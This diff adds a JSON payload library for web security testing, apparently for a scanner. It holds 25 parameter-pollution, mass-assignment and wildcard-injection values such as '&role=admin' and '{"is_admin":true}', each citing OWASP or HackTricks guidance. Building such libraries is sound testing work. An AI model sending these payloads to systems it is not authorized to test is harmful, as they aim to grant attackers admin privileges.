@@ -1,0 +1,152 @@
+[
+  {
+    "id": "param-001", "family": "parameter_pollution", "subtype": "hpp",
+    "payload_string": "admin", "context": "string",
+    "description": "HPP - Single param payload (needs request builder duplication)",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"], "platform_specific": {}
+  },
+  {
+    "id": "param-002", "family": "parameter_pollution", "subtype": "hpp",
+    "payload_string": "true", "context": "string",
+    "description": "HPP - Boolean override",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"], "platform_specific": {}
+  },
+  {
+    "id": "param-003", "family": "parameter_pollution", "subtype": "hpp",
+    "payload_string": "1", "context": "string",
+    "description": "HPP - Numeric override",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"], "platform_specific": {}
+  },
+  {
+    "id": "param-004", "family": "parameter_pollution", "subtype": "sspp",
+    "payload_string": "admin", "context": "string",
+    "description": "SSPP - Secondary parameter shadowing payload",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"], "platform_specific": {}
+  },
+  {
+    "id": "param-005", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"role\":\"admin\"}", "context": "json",
+    "description": "Mass Assignment - role=admin",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-006", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"is_admin\":true}", "context": "json",
+    "description": "Mass Assignment - is_admin=true",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-007", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"privilege\":\"elevated\"}", "context": "json",
+    "description": "Mass Assignment - privilege=elevated",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-008", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"isAdmin\":\"true\"}", "context": "json",
+    "description": "Mass Assignment - isAdmin=true (string)",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-009", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"superuser\":1}", "context": "json",
+    "description": "Mass Assignment - superuser=1",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-010", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"admin\":true}", "context": "json",
+    "description": "Mass Assignment - admin=true",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-011", "family": "parameter_pollution", "subtype": "wildcard",
+    "payload_string": "*", "context": "string",
+    "description": "Wildcard Injection - Asterisk",
+    "references": ["https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks"], "platform_specific": {}
+  },
+  {
+    "id": "param-012", "family": "parameter_pollution", "subtype": "wildcard",
+    "payload_string": "%", "context": "string",
+    "description": "Wildcard Injection - Percent (SQL)",
+    "references": ["https://owasp.org/www-community/attacks/SQL_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "param-013", "family": "parameter_pollution", "subtype": "wildcard",
+    "payload_string": "_", "context": "string",
+    "description": "Wildcard Injection - Underscore (SQL)",
+    "references": ["https://owasp.org/www-community/attacks/SQL_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "param-014", "family": "parameter_pollution", "subtype": "wildcard",
+    "payload_string": "?", "context": "string",
+    "description": "Wildcard Injection - Question mark",
+    "references": ["https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks"], "platform_specific": {}
+  },
+  {
+    "id": "param-015", "family": "parameter_pollution", "subtype": "wildcard",
+    "payload_string": ".*", "context": "string",
+    "description": "Wildcard Injection - Regex wildcard",
+    "references": ["https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS"], "platform_specific": {}
+  },
+  {
+    "id": "param-016", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"role\":[\"user\",\"admin\"]}", "context": "json",
+    "description": "Mass Assignment - Array bypass",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-017", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"permissions\":[\"all\"]}", "context": "json",
+    "description": "Mass Assignment - Permissions array",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-018", "family": "parameter_pollution", "subtype": "hpp",
+    "payload_string": "&role=admin", "context": "string",
+    "description": "HPP - Appending parameter",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"], "platform_specific": {}
+  },
+  {
+    "id": "param-019", "family": "parameter_pollution", "subtype": "hpp",
+    "payload_string": "?role=admin", "context": "string",
+    "description": "HPP - Prepending parameter",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"], "platform_specific": {}
+  },
+  {
+    "id": "param-020", "family": "parameter_pollution", "subtype": "sspp",
+    "payload_string": ";role=admin", "context": "string",
+    "description": "SSPP - Semicolon separator (Java/Spring)",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"], "platform_specific": {}
+  },
+  {
+    "id": "param-021", "family": "parameter_pollution", "subtype": "sspp",
+    "payload_string": "%26role%3Dadmin", "context": "string",
+    "description": "SSPP - URL Encoded appending parameter",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"], "platform_specific": {}
+  },
+  {
+    "id": "param-022", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"account\":{\"role\":\"admin\"}}", "context": "json",
+    "description": "Mass Assignment - Nested object",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-023", "family": "parameter_pollution", "subtype": "mass_assignment",
+    "payload_string": "{\"user\":{\"is_admin\":true}}", "context": "json",
+    "description": "Mass Assignment - Nested user object",
+    "references": ["https://owasp.org/www-project-api-security/v14/API3_2019_Excessive_Data_Exposure/"], "platform_specific": {}
+  },
+  {
+    "id": "param-024", "family": "parameter_pollution", "subtype": "hpp",
+    "payload_string": "&admin=true", "context": "string",
+    "description": "HPP - Admin boolean flag",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"], "platform_specific": {}
+  },
+  {
+    "id": "param-025", "family": "parameter_pollution", "subtype": "wildcard",
+    "payload_string": "/*", "context": "string",
+    "description": "Wildcard Injection - Path wildcard",
+    "references": ["https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks"], "platform_specific": {}
+  }
+]
